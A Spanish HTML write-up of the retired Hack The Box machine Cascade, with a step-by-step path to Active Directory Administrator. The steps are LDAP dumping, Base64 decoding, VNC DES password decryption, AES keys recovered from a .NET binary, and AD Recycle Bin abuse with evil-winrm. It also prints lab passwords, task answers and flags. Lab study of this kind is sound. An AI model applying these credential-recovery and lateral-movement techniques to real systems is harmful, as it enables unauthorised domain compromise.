@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#0b0a1a">
+<meta name="author" content="Sebastián Latorre Muñoz">
+<title>Cascade · HTB · Guía para principiantes // iphobiuss</title>
+<meta name="description" content="Writeup y guía de la máquina Cascade (Hack The Box), la primera Medium de la serie: enumeración LDAP, cascadeLegacyPwd en Base64, descifrado de VNC, reversing de un binario .NET con AES, y abuso de la AD Recycle Bin. Por Sebastián Latorre Muñoz (iphobiuss).">
+<link rel="canonical" href="https://iphobiuss.github.io/cascade.html">
+<meta property="og:title" content="Cascade · HTB · Guía para principiantes">
+<meta property="og:description" content="Primera Medium: ocho eslabones de r.thompson a Domain Admin, con LDAP, VNC, reversing .NET y la papelera de AD.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://iphobiuss.github.io/cascade.html">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' shape-rendering='crispEdges'%3E%3Crect width='24' height='24' fill='%230b0a1a'/%3E%3Cg fill='%2339ff14'%3E%3Crect x='8' y='3' width='8' height='2'/%3E%3Crect x='7' y='5' width='2' height='4'/%3E%3Crect x='15' y='5' width='2' height='4'/%3E%3Crect x='5' y='9' width='14' height='12'/%3E%3C/g%3E%3Cg fill='%230b0a1a'%3E%3Crect x='11' y='12' width='2' height='4'/%3E%3Crect x='10' y='16' width='4' height='2'/%3E%3C/g%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=IBM+Plex+Mono:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/base.css">
+<link rel="stylesheet" href="assets/css/writeup.css">
+<style>
+  :root{--machine:var(--magenta);}
+</style>
+</head>
+<body>
+<a class="skip" href="#contenido">Saltar al contenido</a>
+<div class="crt"></div>
+
+<div class="topbar">
+<nav aria-label="Navegación">
+  <span class="brand"><b>iphobiuss</b>::offsec</span>
+  <span class="links">
+    <a href="index.html">← KNOWLEDGE BASE</a>
+    <a href="sauna.html">SAUNA</a>
+    <a href="#recon">RECON</a><a href="#ldap">LDAP</a><a href="#data">DATA</a>
+    <a href="#vnc">VNC</a><a href="#audit">AUDIT</a><a href="#recyclebin">RECYCLE BIN</a><a href="#tasks">TASKS</a><a href="#takeaways">TAKEAWAYS</a>
+  </span>
+</nav>
+</div>
+
+<main id="contenido">
+<header>
+  <div class="hero">
+    <div class="prompt mono"><span class="g">iphobiuss@offsec</span>:<span class="c">~</span>$ ./pwn --box cascade --difficulty medium</div>
+    <h1 class="pixel">CASCADE</h1>
+    <div class="meta">
+      <span class="badge b1">HTB</span>
+      <span class="badge b2">WINDOWS</span>
+      <span class="badge b4">MEDIUM</span>
+      <span class="badge b5">ACTIVE DIRECTORY</span>
+      <span class="badge b3">REVERSING</span>
+    </div>
+    <p class="pitch">Guía de <b>Cascade</b>, la <b>#6</b> de la serie y la <b>primera Medium</b>. El salto de dificultad no es que un paso sea más duro: es que hay <b>muchos más pasos</b>, y hay que mantener el hilo. Ocho eslabones encadenados, cada uno con una técnica que Forest y Sauna no tenían: enumeración LDAP profunda, Base64, descifrado de VNC, reversing de un binario .NET con AES, y la papelera de reciclaje de Active Directory.</p>
+
+    <div class="chain">
+      <div class="lnk" data-phase="cyan"><div class="n">01</div><div class="t"><b>RECON</b><br>DC sin web</div></div>
+      <div class="lnk" data-phase="amber"><div class="n">02</div><div class="t"><b>LDAP</b><br>legacyPwd → r.thompson</div></div>
+      <div class="lnk" data-phase="green"><div class="n">03</div><div class="t"><b>DATA</b><br>share → 3 archivos</div></div>
+      <div class="lnk" data-phase="cyan"><div class="n">04</div><div class="t"><b>VNC</b><br>descifrar → s.smith</div></div>
+      <div class="lnk" data-phase="magenta"><div class="n">05</div><div class="t"><b>AUDIT</b><br>.NET + AES → arksvc</div></div>
+      <div class="lnk" data-phase="violet"><div class="n">06</div><div class="t"><b>RECYCLE BIN</b><br>TempAdmin → root</div></div>
+    </div>
+  </div>
+</header>
+
+<div class="intro">
+  <b>VPN:</b> Machines (la normal). El flujo de conexión y el <span class="mono">/etc/hosts</span> son los de <a href="forest.html">Forest</a> (ver <a href="setup.html">00 · Setup</a>). En esta guía la IP es <span class="mono">10.129.62.222</span>, el dominio <span class="mono">cascade.local</span> y el DC <span class="mono">CASC-DC1</span>.
+  <br><br>
+  <b>Nota sobre BloodHound:</b> usa <span class="mono">bloodhound-ce-python</span> con BloodHound CE y registra ambas versiones. <span class="mono">bloodhound-python</span> corresponde al recolector legacy y requiere su analizador compatible. Si el ZIP no carga, revisa formato y errores de importación antes de atribuir la causa. La URL y las credenciales de CE proceden del bootstrap/configuración de tu despliegue, como se explica en <a href="forest.html#bloodhound">Forest</a>. Cascade se resuelve por LDAP y shares; BloodHound es opcional aquí.
+</div>
+
+<!-- RECON -->
+<section id="recon" data-phase="cyan">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">01 · RECONOCIMIENTO</h2></div>
+    <div class="sec-focus">Un DC como Forest, pero sin web: la lista de usuarios sale de LDAP/SMB.</div>
+    <pre><span class="k">nmap</span> -p- --min-rate 1000 -oA nmap/allports 10.129.62.222
+<span class="k">nmap</span> -sCV -p 53,88,135,139,389,445,636,3268,3269,5985 -oA nmap/detail 10.129.62.222</pre>
+    <p class="f"><code class="ic">ttl=127</code> sugiere Windows (a confirmar). Huella de <b>Domain Controller</b> (Kerberos 88, LDAP 389/636, SMB 445, WinRM 5985), Windows Server 2008 R2 (un DC viejo). Dominio <b>cascade.local</b>, host <b>CASC-DC1</b>. A diferencia de Sauna, <b>no hay puerto 80</b>: sin web, la lista de usuarios saldrá de LDAP o SMB.</p>
+    <pre><span class="k">sudo</span> sh -c 'echo "10.129.62.222 cascade.local CASC-DC1.cascade.local CASC-DC1" &gt;&gt; /etc/hosts'</pre>
+    <div class="why"><b>ERROR CLÁSICO: Name or service not known</b>Si <code class="ic">GetNPUsers</code> u otra herramienta Kerberos falla con <code class="ic">Name or service not known (CASCADE.LOCAL:88)</code>, no es que el ataque falle: es que falta el <code class="ic">/etc/hosts</code>. Kerberos habla por nombre, no por IP. Configúralo justo después de sacar el dominio.</div>
+  </div>
+</section>
+
+<!-- LDAP -->
+<section id="ldap" data-phase="amber">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">02 · ENUMERACIÓN LDAP</h2></div>
+    <div class="sec-focus">La primera credencial está escondida en un atributo del directorio.</div>
+
+    <h3 class="step">Usuarios (SMB) y AS-REP (falla)</h3>
+    <pre><span class="k">netexec</span> smb 10.129.62.222 -u '' -p '' --users   <span class="cmt"># SÍ da 15 usuarios (a diferencia de Sauna)</span>
+<span class="cmt"># guarda esos 15 usuarios, uno por línea, en users.txt del directorio actual</span>
+<span class="k">netexec</span> smb 10.129.62.222 -u '' -p '' --users | awk 'NR&gt;4{print $5}' | sort -u &gt; users.txt
+<span class="k">impacket-GetNPUsers</span> cascade.local/ -no-pass -usersfile users.txt   <span class="cmt"># ningún usuario roasteable</span></pre>
+    <p class="f">Medium no regala la entrada: el AS-REP Roasting de Forest/Sauna aquí no da nada. Hay que escarbar más.</p>
+
+    <div class="fcard amber">
+      <h4>▚ Atributos de LDAP: donde se esconden secretos</h4>
+      <p>Cada usuario de AD es un objeto con decenas de <b>atributos</b> (campos). Los administradores a veces dejan información sensible en campos poco visibles, incluso personalizados. Volcar todo LDAP y buscar en él es una técnica central de AD.</p>
+    </div>
+
+    <h3 class="step">Volcar y buscar</h3>
+    <pre><span class="k">ldapsearch</span> -x -H ldap://10.129.62.222 -b "DC=cascade,DC=local" &gt; ldap_dump.txt
+<span class="k">grep</span> -i "pwd\|pass\|legacy" ldap_dump.txt</pre>
+    <p class="f">En el objeto de <b>Ryan Thompson</b> aparece un atributo no estándar:</p>
+    <pre># Ryan Thompson, Users, UK, cascade.local
+userPrincipalName: r.thompson@cascade.local
+<span class="o">cascadeLegacyPwd: clk0bjVldmE=</span></pre>
+
+    <div class="why"><b>BASE64 NO ES CIFRADO</b>Ese <code class="ic">clk0bjVldmE=</code> (con <code class="ic">=</code> al final) es <b>Base64</b>: no se crackea, se <b>decodifica</b>, y es instantáneo. Distinto de un hash. Reconocer el patrón ahorra tiempo.</div>
+    <pre><span class="k">echo</span> 'clk0bjVldmE=' | base64 -d   <span class="cmt"># -&gt; rY4n5eva</span></pre>
+    <p class="f">Credenciales: <b><code class="ic">r.thompson</code> / <code class="ic">rY4n5eva</code></b>.</p>
+  </div>
+</section>
+
+<!-- DATA -->
+<section id="data" data-phase="green">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">03 · SHARE DATA</h2></div>
+    <div class="sec-focus">r.thompson no da shell, pero sí acceso a un share con pistas.</div>
+
+    <p class="f">r.thompson no tiene WinRM (es un peldaño intermedio), pero sí lee un share no estándar llamado <b>Data</b>:</p>
+    <pre><span class="k">netexec</span> smb 10.129.62.222 -u r.thompson -p rY4n5eva --shares   <span class="cmt"># Data: READ</span>
+<span class="k">smbclient</span> //10.129.62.222/Data -U 'cascade.local/r.thompson%rY4n5eva'
+smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; ls</pre>
+    <p class="f">Dentro, en <code class="ic">\IT\</code>, tres archivos son la clave. Descárgalos con <code class="ic">get</code> (van entre comillas por los espacios):</p>
+    <div class="tblwrap"><table>
+      <tr><th>Archivo</th><th>Qué revela</th></tr>
+      <tr><td><code>Meeting_Notes_June_2018.html</code></td><td>Existió una cuenta <b>TempAdmin</b> cuya contraseña <b>es la misma que la del Administrator del dominio</b>. Se borraría a fin de 2018.</td></tr>
+      <tr><td><code>ArkAdRecycleBin.log</code></td><td>El usuario <b>arksvc</b> corre un gestor de papelera de AD, y <b>TempAdmin fue movido a la papelera</b> (Deleted Objects).</td></tr>
+      <tr><td><code>VNC Install.reg</code></td><td>En la carpeta de <b>s.smith</b>: la contraseña de VNC de s.smith, cifrada.</td></tr>
+    </table></div>
+    <div class="why"><b>smbclient y las barras de Windows</b>Con <code class="ic">recurse ON</code>, smbclient guarda los archivos con las <code class="ic">\</code> de Windows dentro del nombre. Para leerlos en Linux, envuelve el nombre completo en comillas simples: <code class="ic">cat './IT\Temp\s.smith\VNC Install.reg'</code>.</div>
+  </div>
+</section>
+
+<!-- VNC -->
+<section id="vnc" data-phase="cyan">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">04 · DESCIFRAR VNC → s.smith</h2></div>
+    <div class="sec-focus">El formato legado de este laboratorio usa una clave fija y conocida.</div>
+
+    <div class="fcard cyan">
+      <h4>▚ La contraseña de VNC</h4>
+      <p>El <code class="ic">VNC Install.reg</code> tiene <code class="ic">"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f</code>. Este formato legado guarda la contraseña con una <b>clave DES fija y conocida</b>, por lo que el valor del archivo se puede descifrar. No es una descripción universal de todos los productos o mecanismos de autenticación VNC.</p>
+    </div>
+    <pre><span class="k">echo</span> -n '6bcf2a4b6e5aca0f' | xxd -r -p &gt; vnc.bin
+<span class="k">python3</span> -c "from Crypto.Cipher import DES
+d=open('vnc.bin','rb').read()
+k=b'\xe8\x4a\xd6\x60\xc4\x72\x1a\xe0'
+print(DES.new(k,DES.MODE_ECB).decrypt(d))"   <span class="cmt"># -&gt; sT333ve2</span></pre>
+    <p class="f">Esa clave DES (<code class="ic">e84ad660c4721ae0</code>) corresponde al formato legado usado por el archivo de este laboratorio. Contraseña de <b><code class="ic">s.smith</code> / <code class="ic">sT333ve2</code></b>.</p>
+
+    <h3 class="step">Foothold y user flag</h3>
+    <p class="f">s.smith SÍ tiene WinRM (está en Remote Management Users):</p>
+    <pre><span class="k">netexec</span> winrm 10.129.62.222 -u s.smith -p sT333ve2   <span class="cmt"># (Pwn3d!)</span>
+<span class="k">evil-winrm</span> -i 10.129.62.222 -u s.smith -p sT333ve2
+<span class="k">type</span> C:\Users\s.smith\Desktop\user.txt   <span class="cmt"># user flag</span></pre>
+    <div class="why"><b>DATO DE ENUMERACIÓN: EL LOGON SCRIPT</b>El "script que corre al iniciar sesión" un usuario no es un archivo cualquiera: es el atributo <code class="ic">scriptPath</code> de su cuenta. Se ve con <code class="ic">Get-ADUser s.smith -Properties scriptPath</code> (aquí: <code class="ic">MapAuditDrive.vbs</code>), no con el <code class="ic">.bat</code> que haya por el share.</div>
+  </div>
+</section>
+
+<!-- AUDIT -->
+<section id="audit" data-phase="magenta">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">05 · AUDIT$ + REVERSING → arksvc</h2></div>
+    <div class="sec-focus">La parte más Medium: una contraseña cifrada con AES y la clave en un binario.</div>
+
+    <p class="f">s.smith pertenece al grupo <b>Audit Share</b>, que le abre un share que r.thompson no veía. Dentro está el paquete del "Ark Audit":</p>
+    <pre><span class="k">smbclient</span> '//10.129.62.222/Audit$' -U 'cascade.local/s.smith%sT333ve2'
+<span class="cmt"># CascAudit.exe (.NET) · CascCrypto.dll · DB\Audit.db (SQLite) · RunAudit.bat</span></pre>
+
+    <h3 class="step">La base de datos</h3>
+    <pre><span class="k">sqlite3</span> Audit.db
+sqlite&gt; .tables            <span class="cmt"># DeletedUserAudit  Ldap  Misc</span>
+sqlite&gt; SELECT * FROM Ldap;
+<span class="cmt"># ArkSvc | BQO5l5Kj9MdErXx6Q6AGOw== | cascade.local</span></pre>
+    <div class="why"><b>ESTO NO ES SOLO BASE64</b>El <code class="ic">BQO5l5Kj9MdErXx6Q6AGOw==</code> parece Base64 por el <code class="ic">=</code>, pero está <b>cifrado con AES</b> y luego codificado. Decodificarlo con <code class="ic">base64 -d</code> solo da bytes basura: hay que descifrarlo con la clave correcta.</div>
+
+    <div class="fcard magenta">
+      <h4>▚ Reversing de un binario .NET</h4>
+      <p>La <b>clave AES</b> y el <b>IV</b> están incrustados en <code class="ic">CascAudit.exe</code> / <code class="ic">CascCrypto.dll</code>. Los binarios .NET se <b>descompilan</b> para leer su código casi original. La herramienta ideal es <b>dnSpy</b> (o ILSpy) en Windows, que muestra la llamada a <code class="ic">DecryptString(pwd, "clave")</code> y el <code class="ic">DefaultIV</code>. En Kali los descompiladores (<code class="ic">ilspycmd</code>, <code class="ic">monodis</code>) pueden fallar: ten dnSpy a mano.</p>
+    </div>
+    <p class="f">Del binario se obtiene: clave <code class="ic">c4scadek3y654321</code>, IV <code class="ic">1tdyjCbY1Ix49842</code>, modo <b>AES-CBC</b>. Con eso se descifra:</p>
+    <pre><span class="k">python3</span> -c "from Crypto.Cipher import AES; import base64; \
+e=base64.b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='); \
+print(AES.new(b'c4scadek3y654321',AES.MODE_CBC,b'1tdyjCbY1Ix49842').decrypt(e))"
+<span class="cmt"># -&gt; b'w3lc0meFr31nd\x03\x03\x03'  (el \x03 es padding PKCS7)</span></pre>
+    <p class="f">Contraseña de <b><code class="ic">arksvc</code> / <code class="ic">w3lc0meFr31nd</code></b>. Lección: hardcodear claves en binarios es reversible.</p>
+  </div>
+</section>
+
+<!-- RECYCLE BIN -->
+<section id="recyclebin" data-phase="violet">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">06 · AD RECYCLE BIN → ROOT</h2></div>
+    <div class="sec-focus">En este laboratorio, una delegación permite leer un atributo legado sensible de un objeto eliminado.</div>
+
+    <div class="fcard">
+      <h4>▚ La papelera de reciclaje de Active Directory</h4>
+      <p>Con <b>Active Directory Recycle Bin habilitada</b>, los objetos eliminados conservan atributos durante su estado recuperable. Consultarlos requiere permisos sobre los objetos y el contenedor correspondiente. En <b>Cascade</b>, el grupo personalizado <b>AD Recycle Bin</b> tiene esa delegación y <b>arksvc pertenece a él</b>; no es un grupo incorporado que otorgue ese acceso de forma universal. Lo que se recupera aquí es <code class="ic">cascadeLegacyPwd</code>, un atributo legado personalizado con un secreto en Base64, no la contraseña nativa de AD convertida en texto legible. El email del laboratorio indica que <b>TempAdmin</b> reutilizaba la contraseña de <b>Administrator</b>.</p>
+    </div>
+
+    <h3 class="step">Recuperar TempAdmin</h3>
+    <pre><span class="k">evil-winrm</span> -i 10.129.62.222 -u arksvc -p w3lc0meFr31nd
+PS&gt; Get-ADObject -filter 'isDeleted -eq $true -and Name -like "*TempAdmin*"' -includeDeletedObjects -Properties *
+<span class="cmt"># cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz</span></pre>
+    <p class="f">El atributo personalizado <code class="ic">cascadeLegacyPwd</code> conserva el secreto legado en Base64. En este laboratorio, la reutilización indicada en el email permite validar el valor decodificado como contraseña de Administrator:</p>
+    <pre><span class="k">echo</span> 'YmFDVDNyMWFOMDBkbGVz' | base64 -d   <span class="cmt"># -&gt; baCT3r1aN00dles</span></pre>
+
+    <h3 class="step">Acceso como Administrator</h3>
+    <pre><span class="k">evil-winrm</span> -i 10.129.62.222 -u Administrator -p 'baCT3r1aN00dles'
+<span class="k">type</span> C:\Users\Administrator\Desktop\root.txt   <span class="cmt"># root flag</span></pre>
+    <p class="f"><b>Acceso como Administrator documentado.</b> La reutilización de la contraseña permite autenticar con esa identidad; no demuestra una membresía nueva en Domain Admins.</p>
+
+    <div class="path"><span class="node">r.thompson</span> <span class="rel">─(VNC)→</span> <span class="node">s.smith</span> <span class="rel">─(AES/.NET)→</span> <span class="node">arksvc</span> <span class="rel">─(papelera AD)→</span> <span class="node">TempAdmin (objeto eliminado)</span> <span class="rel">─(reúso de clave)→</span> <span class="node">Administrator</span></div>
+  </div>
+</section>
+
+<!-- TASKS -->
+<section id="tasks" data-phase="amber">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">TASKS · GUIDED MODE</h2></div>
+    <div class="sec-focus">Las flags son de una instancia concreta. En tu máquina serán distintas.</div>
+    <div class="tblwrap"><table>
+      <tr><th>Task</th><th>Respuesta</th></tr>
+      <tr><td>Username de Ryan Thompson</td><td class="ans">r.thompson</td></tr>
+      <tr><td>Contraseña de r.thompson</td><td class="ans">rY4n5eva</td></tr>
+      <tr><td>Share no estándar al que accede r.thompson</td><td class="ans">Data</td></tr>
+      <tr><td>Cuenta temporal a borrar a fin de 2018</td><td class="ans">TempAdmin</td></tr>
+      <tr><td>Contraseña de s.smith</td><td class="ans">sT333ve2</td></tr>
+      <tr><td>Script que corre al iniciar sesión s.smith</td><td class="ans">MapAuditDrive.vbs</td></tr>
+      <tr><td>Base de datos SQLite en el share</td><td class="ans">Audit.db</td></tr>
+      <tr><td>Ejecutable .NET con credenciales cifradas</td><td class="ans">CascAudit.exe</td></tr>
+      <tr><td>Contraseña de arksvc</td><td class="ans">w3lc0meFr31nd</td></tr>
+      <tr><td>Grupo personalizado del laboratorio del que arksvc es miembro</td><td class="ans">AD Recycle Bin</td></tr>
+      <tr><td>Contraseña de la cuenta administrator</td><td class="ans">baCT3r1aN00dles</td></tr>
+      <tr><td>User flag (escritorio de s.smith)</td><td><code>2290720c26e43893eca418ff87d029e5</code></td></tr>
+      <tr><td>Root flag (escritorio de Administrator)</td><td><code>f0b11c370bfe635793f2df9e43304f72</code></td></tr>
+    </table></div>
+  </div>
+</section>
+
+<!-- TAKEAWAYS -->
+<section id="takeaways" data-phase="green">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">EL SALTO A MEDIUM</h2></div>
+    <div class="sec-focus">No un paso más duro: muchos más pasos, y mantener el hilo.</div>
+    <div class="path"><span class="node">SMB users</span> <span class="rel">→</span> <span class="node">LDAP legacyPwd</span> <span class="rel">→</span> <span class="node">share Data</span> <span class="rel">→</span> <span class="node">VNC decrypt</span> <span class="rel">→</span> <span class="node">.NET/AES</span> <span class="rel">→</span> <span class="node">AD Recycle Bin</span> <span class="rel">→</span> <span class="node">Administrator</span></div>
+    <p class="tk-legend"><span class="tk tk-gen">GENERAL</span> principio transferible a otras máquinas. <span class="tk tk-lab">LAB</span> heurística o convención de laboratorio (HTB), no una regla universal.</p>
+    <ul class="takeaways">
+      <li><span class="tk tk-gen">GENERAL</span><b>Enumeración LDAP profunda:</b> revisar los atributos accesibles puede revelar información sensible. La lectura anónima y <code class="ic">cascadeLegacyPwd</code> son condiciones de Cascade, no garantías de AD.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>Base64 ≠ cifrado:</b> el <code class="ic">=</code> al final delata Base64; se decodifica (instantáneo), no se crackea.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>Share hunting:</b> <code class="ic">--shares</code> + <code class="ic">smbclient recurse ON</code> para peinar carpetas en busca de configs, emails y logs.</li>
+      <li><span class="tk tk-lab">LAB</span><b>Descifrado de VNC:</b> el formato legado del archivo de este laboratorio usa una clave DES fija y conocida; no describe todos los mecanismos de credenciales de VNC.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>Reversing .NET:</b> claves AES/IV hardcodeadas en un binario se leen con dnSpy/ILSpy y permiten descifrar secretos.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>SQLite:</b> <code class="ic">sqlite3</code> para leer bases de datos de aplicaciones que dejan credenciales.</li>
+      <li><span class="tk tk-lab">LAB</span><b>AD Recycle Bin en Cascade:</b> una delegación al grupo personalizado permite consultar <code class="ic">cascadeLegacyPwd</code> de TempAdmin. El principio general es proteger también los atributos sensibles de objetos eliminados; ese acceso y ese secreto concreto dependen del laboratorio.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>Encadenar credenciales:</b> cada usuario desbloquea al siguiente (r.thompson → s.smith → arksvc → Administrator).</li>
+      <li><span class="tk tk-lab">LAB</span><b><code class="ic">/etc/hosts</code> para resolver nombres:</b> <code class="ic">Name or service not known</code> en Kerberos = falta el mapeo del dominio (habitual en labs), no un ataque fallido.</li>
+      <li><span class="tk tk-gen">GENERAL</span><b>BloodHound CE vs legacy:</b> empareja analizador y recolector; para CE usa <code class="ic">bloodhound-ce-python</code>. Un error de importación requiere revisar el formato y el registro, no asumir una sola causa.</li>
+    </ul>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div><span class="g">iphobiuss@offsec</span>:~$ <span class="mono">echo "ocho eslabones sin soltar el hilo: eso es una Medium."</span></div>
+  <div>Cascade · Hack The Box · máquina retirada · Medium · #6 de la serie · primera Medium</div>
+  <div>
+    <a href="index.html">Knowledge base</a> ·
+    <a href="sauna.html">← Sauna</a> ·
+    <a href="https://github.com/iphobiuss" target="_blank" rel="noopener">GitHub</a> ·
+    <a href="https://www.linkedin.com/in/sebastian-latorre-munoz/" target="_blank" rel="noopener">LinkedIn</a>
+  </div>
+  <div class="rev">Sebastián Latorre Muñoz · Santiago, CL</div>
+</footer>
+</body>
+</html>
